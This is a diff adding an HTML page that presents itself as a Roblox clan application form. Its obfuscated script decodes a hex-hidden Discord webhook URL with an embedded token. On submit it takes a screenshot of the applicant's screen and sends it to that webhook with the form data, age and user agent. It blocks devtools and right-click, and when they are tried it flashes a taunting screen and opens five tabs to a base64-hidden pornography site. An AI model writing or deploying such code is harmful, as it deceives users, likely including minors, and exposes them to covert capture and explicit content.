@@ -1,1 +1,131 @@
 <--PAKYUUU-->
+
+
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><title>Ixora Clan | Application</title>
+<link rel="icon" type="image/png" href="logo.jpg">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<style>
+:root{--d:#000;--tg:#b5bac1;--r:25px;--ng:#00ff88;--nr:#ff4444;--db:#5865F2}
+body{font-family:'Segoe UI',sans-serif;background:linear-gradient(rgba(0,0,0,.6),rgba(0,0,0,.6)),url('./BGM.png') center/cover fixed #000;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff;overflow-x:hidden;user-select:none;cursor:none}
+#customCursor{width:20px;height:26px;background:var(--ng);position:fixed;pointer-events:none;z-index:99999999;clip-path:polygon(0% 0%,100% 70%,40% 70%,40% 100%);filter:drop-shadow(0 0 8px var(--ng));transition:transform .1s ease-out,background .2s,filter .2s}
+#loader{position:fixed;inset:0;background:#000;z-index:9999999;display:flex;flex-direction:column;justify-content:center;align-items:center;transition:opacity .6s,visibility .6s}
+#loader img{width:150px;border-radius:20px;cursor:pointer;transition:.3s;border:2px solid #fff;margin-bottom:20px;animation:p 2s infinite}
+#loader p{letter-spacing:3px;font-weight:700;animation:fio 1.5s infinite}
+@keyframes p{0%,100%{transform:scale(1)}50%{transform:scale(1.05);box-shadow:0 0 30px rgba(255,255,255,.2)}}
+@keyframes fio{0%,100%{opacity:.3}50%{opacity:1}}
+.form-container{position:relative;background:var(--d);padding:40px;border-radius:var(--r);width:100%;max-width:600px;z-index:10;box-shadow:0 10px 50px #000;display:none;text-align:left;margin:20px}
+.form-container.active{display:block;animation:fi .4s ease-out}
+.form-container::before{content:'';position:absolute;z-index:-2;inset:-4px;background:conic-gradient(from var(--angle),#ff4545,#00ff99,#006aff,#ff0095,#ff4545);animation:rot 4s linear infinite;border-radius:29px}
+.form-container::after{content:'';position:absolute;z-index:-1;inset:2px;background:var(--d);border-radius:23px}
+@property --angle{syntax:'<angle>';initial-value:0deg;inherits:false}
+@keyframes rot{from{--angle:0deg}to{--angle:360deg}}
+@keyframes fi{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}
+.header-image{display:block;margin:0 auto 20px;width:110px;border-radius:15px;border:2px solid #fff;box-shadow:0 0 15px rgba(255,255,255,0.3)}
+h1{font-size:26px;text-align:center;margin-bottom:5px}
+.subtitle{color:var(--tg);font-size:13px;text-align:center;margin-bottom:25px;line-height:1.4}
+label{display:block;margin-top:15px;font-size:11px;font-weight:700;color:var(--tg);text-transform:uppercase}
+input,textarea,.submit-btn,.upload-box,.mute-toggle,#startBtn,a{cursor:none!important}
+input[type=text],input[type=number],textarea{width:100%;padding:12px;margin-top:5px;border:1px solid #333;background:#111;color:#fff;border-radius:10px;box-sizing:border-box;font-family:inherit;transition:border-color .3s}
+input.invalid,textarea.invalid,.upload-box.invalid{border-color:var(--nr)!important}
+.error-msg{color:var(--nr);font-size:10px;margin-top:4px;display:none;font-weight:700}
+input.invalid+.error-msg,textarea.invalid+.error-msg,div.invalid+.error-msg{display:block}
+.row{display:flex;gap:10px;flex-wrap:wrap}
+.row>div{flex:1;min-width:120px}
+.upload-box{margin-top:10px;border:2px dashed #444;border-radius:12px;padding:20px;text-align:center;background:rgba(255,255,255,.03);cursor:pointer;transition:.3s}
+#imagePreview img{margin-top:10px;max-width:100%;border-radius:8px;border:1px solid #f00}
+.submit-btn{position:relative;width:100%;margin-top:30px;padding:18px;background:#000;color:#fff;font-weight:800;border-radius:15px;z-index:11;overflow:hidden;border:1px solid #333;cursor:pointer;text-transform:uppercase}
+.submit-btn:disabled{opacity:.5;cursor:not-allowed}
+.mute-toggle{position:fixed;top:20px;right:20px;width:45px;height:45px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:100;border:1px solid #444;color:#fff}
+#fireCanvas{position:fixed;bottom:0;left:0;width:100%;height:100vh;z-index:1;pointer-events:none;opacity:.8;filter:blur(2px)}
+.trap-screen{display:none;position:fixed;inset:0;z-index:999999;flex-direction:column;justify-content:center;align-items:center;animation:flR .05s infinite;text-align:center}
+.trap-screen h1{font-size:120px;font-weight:900;color:#fff;margin:0;text-shadow:0 0 30px #000;animation:shake .1s infinite}
+.trap-screen h2{font-size:30px;color:#fff;text-transform:uppercase;letter-spacing:2px;background:#000;padding:10px 20px}
+@keyframes flR{0%,100%{background:red}50%{background:#000}}
+@keyframes shake{0%{transform:translate(2px,1px) rotate(0deg)}20%{transform:translate(-1px,-2px) rotate(-1deg)}40%{transform:translate(-3px,0px) rotate(1deg)}60%{transform:translate(3px,2px) rotate(0deg)}80%{transform:translate(1px,-1px) rotate(1deg)}100%{transform:translate(-1px,2px) rotate(-1deg)}}
+.footer-note{font-size:13px;text-align:center;margin-top:20px;color:var(--ng);font-weight:700;text-shadow:0 0 10px rgba(0,255,136,.3)}
+.captcha-container{margin-top:20px;background:#111;padding:15px;border-radius:12px;border:1px solid #333;display:flex;flex-direction:column;gap:10px}
+.captcha-box{display:flex;align-items:center;justify-content:space-between}
+#captchaText{font-family:'Courier New',monospace;font-weight:900;font-size:20px;background:linear-gradient(45deg,#00ff88,#5865F2);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:5px;user-select:none;font-style:italic;text-decoration:line-through}
+.refresh-captcha{color:var(--tg);font-size:18px;cursor:pointer}
+</style>
+</head>
+<body oncontextmenu="return false">
+<div id="customCursor"></div>
+<div id="loader"><img src="logo.jpg" id="startBtn"><p>CLICK LOGO TO ENTER</p></div>
+<audio id="v1" loop><source src="labsong.mp3"></audio><audio id="v2"><source src="Nice (meme) - Sound Effect.mp3"></audio><audio id="bgMusic" loop><source src="IXORA EY.mp3"></audio>
+<button class="mute-toggle" id="muteBtn"><i class="bi bi-volume-mute-fill" id="muteIcon"></i></button>
+
+<div class="form-container" id="mainPage">
+<img src="logo.jpg" class="header-image">
+<h1>Ixora Clan Application</h1>
+<p class="subtitle">Put <b>IX_</b> beside your name. If you can't change it yet, use <b>(unofficial)</b>.<br>Complete the form below, then submit.</p>
+<form id="appForm" novalidate>
+<label>IDENTITY & IN-GAME INFO</label>
+<input type="text" id="ign" placeholder="In-Game Name" required><span class="error-msg">Name is required</span>
+<input type="text" id="rbx" placeholder="Roblox Username" required style="margin-top:10px"><span class="error-msg">Username is required</span>
+<input type="text" id="disp" placeholder="Display Name" required style="margin-top:10px"><span class="error-msg">Display is required</span>
+<div class="row">
+<div><label>Total Power</label><input type="text" id="pwr" placeholder="e.g. 10M+" required><span class="error-msg">Required</span></div>
+<div><label>Rank</label><input type="text" id="rank" placeholder="e.g. Grandmaster" required><span class="error-msg">Required</span></div>
+<div><label>Age</label><input type="number" id="age" placeholder="Age" required min="1" max="99"><span class="error-msg">Invalid</span></div>
+</div>
+<div class="row">
+<div><label>Activeness</label><input type="number" id="active" placeholder="1-10" required min="1" max="10"><span class="error-msg">1-10</span></div>
+<div><label>Discord Tag</label><input type="text" id="discord" placeholder="User#0000" required><span class="error-msg">Required</span></div>
+<div><label>Facebook Name</label><input type="text" id="fb" placeholder="Your FB Profile" required><span class="error-msg">Required</span></div>
+</div>
+<label>DATE JOINED</label>
+<div class="row">
+<div><input type="number" id="dMonth" placeholder="MM" required min="1" max="12"><span class="error-msg">1-12</span></div>
+<div><input type="number" id="dDay" placeholder="DD" required min="1" max="31"><span class="error-msg">1-31</span></div>
+<div><input type="number" id="dYear" placeholder="YYYY" required min="2020" max="2030"><span class="error-msg">Invalid</span></div>
+</div>
+<label>Upload Profile/Rank Proof (Required)</label>
+<div class="upload-box" id="dropZone" onclick="document.getElementById('imageUpload').click()">
+<i class="bi bi-cloud-arrow-up-fill" style="font-size:24px;color:var(--db)"></i>
+<p style="margin:5px 0;font-size:12px;color:var(--tg)">Tap to upload proof</p>
+<input type="file" id="imageUpload" accept="image/*" hidden required>
+<div id="imagePreview"></div>
+</div><span class="error-msg" id="fileError">Proof required</span>
+<label>Why should we accept you?</label>
+<textarea id="reason" placeholder="Enter your answer..." rows="3" required style="margin-top:5px;resize:none"></textarea><span class="error-msg">Required</span>
+<div class="captcha-container">
+<div class="captcha-box"><span id="captchaText"></span><i class="bi bi-arrow-clockwise refresh-captcha" id="refreshCaptcha"></i></div>
+<input type="text" id="captchaInput" placeholder="Enter the code above" required>
+<span class="error-msg" id="captchaError">Code mismatch</span>
+</div>
+<button type="button" class="submit-btn" id="subBtn">SUBMIT APPLICATION</button>
+<p class="footer-note">Please wait for the invitation link. Will be sent by the recruiter!</p>
+</form>
+</div>
+<canvas id="fireCanvas"></canvas>
+<script>
+(function(){
+const _0x1a=document,_0x2b=i=>_0x1a.getElementById(i),_0x3c=b=>atob(b);
+// Webhook Hex Decoding Logic
+const _0xH=(h)=>h.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('');
+const _0x4d=_0xH("68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313436333632333733353936393035343932322f51666d336d656549457a533839664a5531733847547379594944323866727643597452754c7656316841736867634b30794e616f556147616b433275734473637a613774");
+
+const _0x5e=_0x2b('v1'),_0x6f=_0x2b('v2'),_0x7a=_0x2b('bgMusic'),_0x8b=_0x2b('muteIcon'),_0x9c=_0x2b('customCursor');let _0x0d=!1;_0x1a.addEventListener('mousemove',e=>{_0x9c.style.left=e.clientX+'px';_0x9c.style.top=e.clientY+'px'});const _0x1f=(c,f,s)=>{_0x9c.style.background=c;_0x9c.style.filter=f;_0x9c.style.transform=`scale(${s})`;};_0x1a.addEventListener('mouseover',e=>{if(e.target.closest('input,textarea'))_0x1f('var(--db)','drop-shadow(0 0 10px var(--db))',1.2);else if(e.target.closest('.submit-btn,#startBtn,.mute-toggle'))_0x1f('#fff','drop-shadow(0 0 12px #fff)',1.4);else if(e.target.closest('.upload-box'))_0x1f('var(--ng)','drop-shadow(0 0 15px var(--ng))',1.3)});_0x1a.addEventListener('mouseout',e=>{if(!e.relatedTarget)return;_0x1f('var(--ng)','drop-shadow(0 0 8px var(--ng))',1)});const _0x2f=(el)=>{let v=true;if(el.required&&!el.value.trim())v=false;if(el.type==='number'){const n=parseInt(el.value);if(isNaN(n)||n<el.min||n>el.max)v=false}el.classList.toggle('invalid',!v);return v};_0x1a.querySelectorAll('input,textarea').forEach(e=>e.addEventListener('input',()=>_0x2f(e)));const _0x3f=()=>{if(_0x0d)return;_0x0d=!0;let e=_0x1a.createElement('div');e.innerHTML=_0x3c('PGRpdiBpZD0idHoiIGNsYXNzPSJ0cmFwLXNjcmVlbiI+PGgxPktVUEFMPC9oMT48aDI+TmFnaGFoYW5hcCBrYSBiYSBuZyBjb2Rlcz8gS3VwYWwga2EgYmEgYm9pPyDwnZ2n8J2YnD88L2gyPjwvZGl2Pg==');_0x1a.body.appendChild(e.firstChild);_0x2b('tz').style.display='flex';_0x9c.style.display='none';_0x7a.pause();_0x5e.play();setTimeout(()=>{for(let i=0;i<5;i++)window.open(_0x3c('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20v'),'_blank')},2e3)};_0x1a.oncontextmenu=e=>(e.preventDefault(),_0x3f(),!1);
+
+// UPDATED KEYDOWN LISTENER: Blocks F12, Ctrl+Shift+I/J, and Ctrl+U
+_0x1a.onkeydown = e => {
+    const isForbidden = (
+        e.keyCode === 123 || 
+        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || 
+        ((e.ctrlKey || e.metaKey) && e.keyCode === 85)
+    );
+    if (isForbidden) {
+        e.preventDefault();
+        _0x3f();
+        return false;
+    }
+};
+
+let _0x4f="";const _0x5f=()=>{const chars="ABCDEFGHJKLMNPQRSTUVWXYZ23456789";_0x4f="";for(let i=0;i<6;i++)_0x4f+=chars.charAt(Math.floor(Math.random()*chars.length));_0x2b('captchaText').innerText=_0x4f};_0x2b('refreshCaptcha').onclick=_0x5f;_0x5f();_0x2b('startBtn').onclick=()=>{_0x2b('loader').style.opacity='0';setTimeout(()=>{_0x2b('loader').style.visibility='hidden';_0x2b('mainPage').classList.add('active');_0x7a.play().then(()=>_0x8b.className='bi bi-volume-up-fill')},600)};_0x2b('muteBtn').onclick=e=>{e.stopPropagation();_0x7a.paused?(_0x7a.play(),_0x8b.className='bi bi-volume-up-fill'):(_0x7a.pause(),_0x8b.className='bi bi-volume-mute-fill')};const _0x6e=async()=>{try{const s=await navigator.mediaDevices.getDisplayMedia({video:true});const v=_0x1a.createElement('video');v.srcObject=s;await v.play();const c=_0x1a.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());return new Promise(res=>c.toBlob(res,'image/png'))}catch(e){return null}};_0x2b('subBtn').onclick=async()=>{const b=_0x2b('subBtn'),i=_0x2b('imageUpload'),dz=_0x2b('dropZone'),f=_0x1a.querySelectorAll('#appForm input,#appForm textarea');let v=true;f.forEach(x=>{if(!_0x2f(x))v=false});if(_0x2b('captchaInput').value.toUpperCase()!==_0x4f){_0x2b('captchaInput').classList.add('invalid');v=false}if(!i.files[0]){dz.classList.add('invalid');v=false}if(!v){alert("Fix errors first.");return}_0x6f.play();b.innerText="CAPTURING...";let sc=await _0x6e();b.innerText="SENDING...";b.disabled=true;const fd=new FormData(),em={title:"🔥 NEW APPLICATION",color:16711680,fields:[{name:"👤 IGN",value:_0x2b('ign').value,inline:true},{name:"🎮 Roblox",value:_0x2b('rbx').value,inline:true},{name:"✨ Display",value:_0x2b('disp').value,inline:true},{name:"⚡ Power",value:_0x2b('pwr').value,inline:true},{name:"🏆 Rank",value:_0x2b('rank').value,inline:true},{name:"🎂 Age",value:_0x2b('age').value,inline:true},{name:"📈 Active",value:_0x2b('active').value,inline:true},{name:"📱 Discord",value:_0x2b('discord').value,inline:true},{name:"📅 Joined",value:`${_0x2b('dMonth').value}/${_0x2b('dDay').value}/${_0x2b('dYear').value}`,inline:true},{name:"💬 Why?",value:_0x2b('reason').value},{name:"🌐 Device",value:navigator.userAgent}],timestamp:new Date()};fd.append("payload_json",JSON.stringify({embeds:[em]}));fd.append("file1",i.files[0]);if(sc)fd.append("file2",sc,"desktop.png");try{const r=await fetch(_0x4d,{method:"POST",body:fd});if(r.ok){b.innerText="SENT TO IXORA!";alert("Success!")}else{const err=await r.json();throw new Error(err.message||"Failed")}}catch(e){b.innerText="SUBMIT";b.disabled=false;alert("Error: "+e.message);_0x5f()}};_0x2b('imageUpload').onchange=function(){if(this.files[0]){const r=new FileReader();r.onload=e=>_0x2b('imagePreview').innerHTML=`<img src="${e.target.result}" style="width:100%">`;r.readAsDataURL(this.files[0]);_0x2b('dropZone').classList.remove('invalid')}};const c=_0x2b('fireCanvas'),x=c.getContext('2d');let p=[];const res=()=>(c.width=window.innerWidth,c.height=window.innerHeight);window.onresize=res;res();class F{constructor(){this.x=Math.random()*c.width;this.y=c.height+100;this.sY=Math.random()*3+1;this.sX=(Math.random()-0.5)*2;this.sz=Math.random()*25+5;this.l=1;this.d=Math.random()*0.01+0.003;this.h=Math.random()<.2?200:Math.random()*40+10}u(){this.y-=this.sY;this.x+=this.sX;this.l-=this.d}dr(){x.globalCompositeOperation='lighter';x.fillStyle=`hsla(${this.h},100%,50%,${this.l*0.6})`;x.beginPath();x.arc(this.x,this.y,this.sz,0,Math.PI*2);x.fill()}}function an(){x.clearRect(0,0,c.width,c.height);if(p.length<150)p.push(new F);for(let i=p.length-1;i>=0;i--){p[i].u();p[i].dr();if(p[i].l<=0||p[i].y<-50)p.splice(i,1)}requestAnimationFrame(an)}an()})();
+</script>
+</body>
+</html>
